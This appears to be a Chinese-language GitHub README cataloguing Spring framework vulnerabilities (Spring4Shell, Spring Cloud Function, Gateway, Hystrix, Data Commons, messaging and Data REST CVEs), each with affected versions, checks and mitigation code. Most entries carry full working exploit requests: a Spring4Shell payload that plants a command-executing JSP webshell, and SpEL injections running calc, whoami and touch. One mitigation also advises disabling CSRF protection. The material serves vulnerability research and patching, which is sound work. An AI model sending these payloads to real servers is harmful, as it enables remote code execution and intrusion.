# SpringFramework-Vul
一些spring框架相关的漏洞

# Spring4Shell - CVE-2022-22965

- #### 影响版本

  ###### Springframework 5.3.0到5.3.17、5.2.0 到 5.2.19、以及更早的不受支持的版本

  ###### Springboot低版本由于间接引入受影响的SpringFramework，且也受到漏洞影响。

- #### 安全版本

  ###### 5.3.18+

  ###### 5.2.20+

- #### 排查方法

  ###### 1、检查lib目录或pom中的框架版本是否在漏洞版本中

  ###### 2、是否使用JDK9及以上版本

  ###### 3、使用tomcat作为Servlet容器，且打war包部署（Springboot用内置tomcat打jar不受影响）

- #### 漏洞利用

  ###### 命令执行（生产环境测试慎用）：

  ```html
  数据包如下（复制时候注意删除\r\n，试验环境写入webapps/ROOT不能执行jsp,因此换到webapps下其他目录）：
  
  POST /CVE-2022-22965/get HTTP/1.1
  Host: 192.168.1.5:8080
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 697
  suffix: %>//
  c: Runtime
  prefix: <%
  
  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/123&class.module.classLoader.resources.context.parent.pipeline.first.prefix=12345&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
  ```

  ###### 漏洞探测：

  ```
  class.module.classLoader.resources.context.configFile=http://dnslog地址&class.module.classLoader.resources.context.configFile.content.aaa=xxx
  ```

  

- #### 缓解措施

  ###### 不升级组件的缓解措施：

  ###### 除了WAF以及其他安全监控设备上更新该漏洞相关规则以外，还可以在controller层通过指定WebDataBinder参数绑定的黑名单，再次对恶意语句的关键字进行过滤，阻止程序将其绑定到POJO上。

  ```java
    @InitBinder
      public void initBinder(WebDataBinder binder) {
          String[] blackList = {"class.*", "Class.*", "*.class.*", ".*Class.*"};
          binder.setDisallowedFields(blackList);
      }
  ```
  ![image-20220427112322300](https://user-images.githubusercontent.com/33454436/166195202-02525e45-7a27-4985-9d2b-90537ae3a6ab.png)

  
  ###### 或者通过创建一个ControllerAdvice组件，对危险参数进行拦截

  ```java
  @ControllerAdvice
  @Order(10000)
  public class BinderControllerAdvice {
      @InitBinder
      public void setAllowedFields(WebDataBinder dataBinder) {
           String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
           dataBinder.setDisallowedFields(denylist);
      }
  
  }
  ```
  ![image-20220427125706823](https://user-images.githubusercontent.com/33454436/166195219-c4b73b43-2bd2-4ef1-bcbb-d915cf1ec293.png)

  

  

------

# Spring Cloud Function Spel表达式注入 CVE-2022-22963

- #### 影响版本：

  ###### Spring Cloud Function 3.1.6、3.2.2

- #### 安全版本：

  ###### 3.1.7

  ###### 3.2.3

- #### 排查方法：

  ###### 检查lib目录或pom中的Function组件版本是否在漏洞版本中，且应用中使用Function

- #### 漏洞利用：

  ###### 网上有些帖子说需要利用的前置条件是配置spring.cloud.function.definition=functionRouter。我用默认配置也同样能执行命令，这块有懂的可以说下。

  ###### 命令执行：

  ```
  POST /functionRouter HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
  Content-Type: text/plain
  Content-Length: 4
  
  test
  ```

  ![image-20220428105937657](https://user-images.githubusercontent.com/33454436/166195416-ca7427bb-64e2-44e8-99f8-583637875fb6.png)

- #### 缓解措施：

  ###### 无。

------

# Spring Cloud Gateway-CVE-2022-22947 远程代码执行

- #### 影响版本

  ###### Spring Cloud Gateway 3.1.0、3.0.0 to 3.0.6、以及更早的不受支持的版本

- #### 安全版本

  ###### Spring Cloud Gateway升级到3.11及以上或3.0.7及以上

- #### 排查方法

  ###### 检查lib目录或pom中的Gateway组件版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```
  一、添加路由
  POST /actuator/gateway/routes/qqq HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/json
  Content-Length: 329
  
  {
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com"
  }
  
  二、刷新路由
  POST /actuator/gateway/refresh HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 0
  
  三、查看
  GET /actuator/gateway/routes/qqq HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 0
  
  四、删除路由
  DELETE /actuator/gateway/routes/qqq HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  
  五、重复刷新路由步骤
  ```

  

- #### 缓解措施

  ###### 无。不要将路由映射到互联网。

------

# Spring Cloud Netflix Hystrix Dashboard 模板解析漏洞 CVE-2021-22053

- #### 影响版本

  ###### Spring Cloud Netflix  2.2.0.RELEASE到2.2.9.RELEASE、以及更早的不受支持的版本

- #### 安全版本

  ###### Spring Cloud Netflix 升级到2.2.10.RELEASE及以上

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spring Cloud Netflix版本是否在漏洞版本中（本文试验版本Greenwich.SR6）

  ###### 2、检查pom中是否存在thymeleaf组件、hystrix-dashboard组件

  ```
  <dependency>
      <groupId>org.springframework.cloud</groupId>
      <artifactId>spring-cloud-starter-netflix-hystrix-dashboard</artifactId>
       <scope>compile</scope>
  </dependency>
  <dependency>
       <groupId>org.springframework.boot</groupId>
       <artifactId>spring-boot-starter-thymeleaf</artifactId>
  /dependency>
  
  该漏洞需满足系统中存在以上两个组件，且存在漏洞版本中。
  
  spring-cloud-starter-netflix-hystrix-dashboard组件当前最高版本2.2.10.RELEASE(2022/4/30)，但其间接引入spring-cloud-netflix-hystrix-dashboard 2.1.5.RELEASE，因此单独升级spring-cloud-starter-netflix-hystrix-dashboard不能解决漏洞；
  可以先引入spring-cloud-starter-netflix-hystrix-dashboard 2.2.10.RELEASE，可以先从中排除spring-cloud-netflix-hystrix-dashboard 2.1.5.RELEASE，然后引入spring-cloud-netflix-hystrix-dashboard 2.2.10.RELEASE版本，如下图所示：
  ```

  ![image-20220430211542711](https://user-images.githubusercontent.com/33454436/166195676-bb510f97-1f15-41b1-826a-22ab801189df.png)


- #### 漏洞利用

  ###### 命令执行：

  ```
  http://127.0.0.1:8080/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(new String[]{\"calc\"})}__::.x/
  ```

- #### 缓解措施

  ###### 无。

------

# RDF（反射型文件下载）CVE-2020-5421

- #### 影响版本

  ###### Spring Framework 5.2.0 到 5.2.8、5.1.0 到5.1.17、5.0.0 到 5.0.18、4.3.0 到 4.3.28、以及更早的版本

- #### 安全版本

  ###### Spring Framework升级到5.2.9、5.1.18、5.0.19、4.3.29

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spring Framework版本是否在漏洞版本中

  ###### 2、application.properties或yaml中存在如下配置：

  ###### spring.mvc.pathmatch.use-suffix-pattern=true

  ###### spring.mvc.contentnegotiation.favor-path-extension=true

- #### 漏洞利用

  ```
  http://localhost:8080/demo/;jsessionid=/get.bat?str=calc
  
  其中demo是controller中类上的注解的value值，get是方法上的注解value值，str是形参名，calc是可控的bat文件的内容
  
  结合下图可见，可控形参的值需为当前接口的返回值时才可能导致该漏洞
  ```

  ![image-20220430235739162](https://user-images.githubusercontent.com/33454436/166195856-cb717ad0-0d02-4b39-a76b-9afff19af239.png)

- #### 缓解措施

  通过配置过滤器缓解漏洞，白名单请依据具体业务所需进行增删

  ```
  package com.example.cve20205421;
  
  import org.springframework.context.annotation.Configuration;
  import org.springframework.http.HttpHeaders;
  import org.springframework.http.MediaType;
  import org.springframework.lang.Nullable;
  import org.springframework.util.CollectionUtils;
  import org.springframework.util.StringUtils;
  import org.springframework.web.servlet.HandlerMapping;
  import org.springframework.web.util.UrlPathHelper;
  
  import javax.servlet.*;
  import javax.servlet.http.HttpServletRequest;
  import javax.servlet.http.HttpServletResponse;
  import java.io.IOException;
  import java.util.Arrays;
  import java.util.HashSet;
  import java.util.Locale;
  import java.util.Set;
  
  /**
   * Date : 2022/4/30
   * Time : 23:32
   * Author : Nbp
   * 通过全局过滤器缓解漏洞
   */
  @Configuration
  public class RDFFilter implements Filter {
      private final Set<String> safeExtensions = new HashSet<>();
      /*
       *
       * WHITELISTED_EXTENSIONS 中依据具体业务需求所需进行调整，尽可能减少白名单范围
       * */
      private static final Set<String> WHITELISTED_EXTENSIONS = new HashSet<>(Arrays.asList(
              "txt", "text", "yml", "properties", "csv",
              "json", "xml", "atom", "rss",
              "png", "jpe", "jpeg", "jpg", "gif", "wbmp", "bmp"));
              
      @Override
      public void init(FilterConfig filterConfig) throws ServletException {
          Filter.super.init(filterConfig);
      }
      
      @Override
      public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
          HttpServletRequest request = (HttpServletRequest) servletRequest;
          HttpServletResponse response = (HttpServletResponse) servletResponse;
  
          String contentDisposition = response.getHeader(HttpHeaders.CONTENT_DISPOSITION);
          if (!"".equals(contentDisposition) && null != contentDisposition) {
              return;
          }
  
          try {
              int status = response.getStatus();
              if (status < 200 || status > 299) {
                  return;
              }
          } catch (Throwable ex) {
          }
          String requestUri = request.getRequestURI();
          if (requestUri.contains(";jsessionid=")) {
              int index = requestUri.lastIndexOf('/') + 1;
              String filename = requestUri.substring(index);
              String pathParams = "";
              index = filename.indexOf(';');
              if (index != -1) {
                  pathParams = filename.substring(index);
                  filename = filename.substring(0, index);
              }
              UrlPathHelper decodingUrlPathHelper = new UrlPathHelper();
              filename = decodingUrlPathHelper.decodeRequestString(request, filename);
              String ext = StringUtils.getFilenameExtension(filename);
              pathParams = decodingUrlPathHelper.decodeRequestString(request, pathParams);
              String extInPathParams = StringUtils.getFilenameExtension(pathParams);
              if (!safeExtension(request, ext) || !safeExtension(request, extInPathParams)) {
                  response.addHeader(HttpHeaders.CONTENT_DISPOSITION, "inline;filename=test.txt");
              }
          }
          filterChain.doFilter(servletRequest, servletResponse);
      }
  
      private boolean safeExtension(HttpServletRequest request, @Nullable String extension) {
          if (!StringUtils.hasText(extension)) {
              return true;
          }
          extension = extension.toLowerCase(Locale.ENGLISH);
          this.safeExtensions.addAll(WHITELISTED_EXTENSIONS);
          if (this.safeExtensions.contains(extension)) {
              return true;
          }
          String pattern = (String) request.getAttribute(HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);
          if (pattern != null && pattern.endsWith("." + extension)) {
              return true;
          }
          if (extension.equals("html")) {
              String name = HandlerMapping.PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE;
              Set<MediaType> mediaTypes = (Set<MediaType>) request.getAttribute(name);
              if (!CollectionUtils.isEmpty(mediaTypes) && mediaTypes.contains(MediaType.TEXT_HTML)) {
                  return true;
              }
          }
          return false;
      }
  
  }
  ```

  

------

# Spring Data Commons Spel表达式注入 CVE-2018-1273

- #### 影响版本

  ###### Spring Data Commons 1.13 到 1.13.10 (Ingalls SR10)

  ###### Spring Data REST 2.6 到 2.6.10 (Ingalls SR10)

  ###### Spring Data Commons 2.0 到 2.0.5 (Kay SR5)

  ###### Spring Data REST 3.0 到 3.0.5 (Kay SR5)

  ###### 不受支持的旧版本也会受到影响

- #### 安全版本

  ###### 2.0.x 用户应该升级到 2.0.6、1.13.x 用户应升级到 1.13.11

- #### 排查方法

  ###### 检查lib目录或pom中的Spring Data Commons版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```
  POST /demo/get HTTP/1.1
  Host: 192.168.1.5:8080
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 56
  
  user[T(java.lang.Runtime).getRuntime().exec(%22calc%22)]
  
  
  COntroller:DemoInter是一个接口，接口中的属性都可以作为payload
  @RestController
  @RequestMapping("/demo")
  public class Demo {
  
  
      @RequestMapping("/get")
      public String get(DemoInter demoInter){
          return "haha";
      }
      @RequestMapping("/get2")
      public String get2(bean2 demoInter){
          return "haha";
      }
  
  }
  
  public interface DemoInter {
      String getName();
      String[] getUser();
  }
  ```

  ##### 通过diff，大家都知道这还是一个Spel注入问题，漏洞触发点在MapDataBind的setPropertyValue()

  ![image-20220501015854596](https://user-images.githubusercontent.com/33454436/166196185-441eaff6-6640-4c7a-a02d-2c70f4f7bc16.png)

  ##### 如代码块中所示，Controller中存在两个接口，get的形参是Demointer(接口) ，get2的形参是一个类；

  ##### 通过debug找到数据绑定的如下节点，对这里有些疑惑
  ![image-20220501021616494](https://user-images.githubusercontent.com/33454436/166196236-82ed5b86-bf9e-43ed-bfcb-6176c13f86d0.png)
  

  ##### 为什么这里返回的ConfigurablePropertyAccessor的是MapDataBind的MapPropertyAccessor，这就使后续的setPropertyValue()调用会进入到MapDataBind，而形参是一个类的则在PropertyAccessor返回类型是不一样的，难道是形参为接口类型的数据绑定时PropertyAccessor都应该用MapPropertyAccessor吗？而且上在pom中注释掉commons坐标，启动时候会报没有DemoInter的init方法。
  ![image-20220501021959622](https://user-images.githubusercontent.com/33454436/166196269-b3f18afb-d823-4628-85da-dee0372a71ad.png)

  




- #### 缓解措施

无

------

# spring-messaging 远程执行代码  CVE-2018-1270

- #### 影响版本

  ###### Spring Framework 5.0 到 5.0.4、4.3 到 4.3.15、不受支持的旧版本也会受到影响

- #### 安全版本

  ###### 5.0.x 用户应升级到 5.0.5

  ###### 4.3.x 用户应升级到 4.3.16

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spring Framework版本是否在漏洞版本中

  ###### 2、检查应用程序是否使用spring-messaging组件

- #### 漏洞利用

  ###### 命令执行：

  ```
  向STOMP代理发送SUBSCRIBE包：
  ["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\n\nu0000"]
  ```

- #### 缓解措施

  无。

------

# Spring Data REST 中 PATCH Spel表达式注入 CVE-2017-8046

- #### 影响版本

  ###### 2.6.9 (Ingalls SR9)、3.0.1 (Kay SR1) 之前的 Spring Data REST 版本

  ###### Spring Boot（如果使用 Spring Data REST 模块）1.5.9、2.0 M6 之前的版本

- #### 安全版本

  ###### Spring Data REST 2.6.9（Ingalls SR9）

  ###### Spring Data REST 3.0.1（Kay SR1）

  ###### Spring Boot 1.5.9

  ###### Spring Boot 2.0 M6

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spingboot和Spring Data REST版本是否在漏洞版本中

  ###### 2、检查应用程序是否使用Spring Data REST组件

- #### 漏洞利用

  ###### 命令执行：

  ```
  PATCH /people/1 HTTP/1.1
  Host: localhost:8080
  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type:application/json-patch+json
  Upgrade-Insecure-Requests: 1
  Content-Length: 147
  
  [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))/lastName", "value": "vulhub" }]
  ```

- #### 缓解措施

  ###### 不使用Spring Data Rest可构建Rest Web则不影响；

  ###### 官方未给出缓解措施，自己写了如下缓解demo，经测试可用

  一、

  ###### 通过实现RepositoryRestConfigurer接口，ExposureConfiguration对象也可以自定义不使用某种请求方式，但ExposureConfiguration在3.1版本才有。

  

  ###### 二、这个方法要在系统中引入spring security，限制使用PATCH请求头：

  ```java
  @Configuration
  @EnableWebSecurity
  public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter {
      @Value("${security.enable-csrf}")
      private boolean csrfEnabled;
  
      @Override
      protected void configure(HttpSecurity http) throws Exception {
          if (!csrfEnabled) {
              http.csrf().disable();
          }
          http.authorizeRequests()
                  .antMatchers(HttpMethod.PATCH, "/**").denyAll();
      }
  }
  ```

  ###### security 4.x默认开启CSRF防护，如果之前系统中没用这个，那么要在配置文件中关闭csrf:

  ###### security.enable-csrf=false,如果不生效就按照我这样写

  ![image-20220502012235913](https://user-images.githubusercontent.com/33454436/166196330-e42ffcf6-d07a-4dac-8990-1f851d00a928.png)
  ![image-20220502012251291](https://user-images.githubusercontent.com/33454436/166196336-fc92233b-3400-4e61-904c-7e67ad5cf949.png)

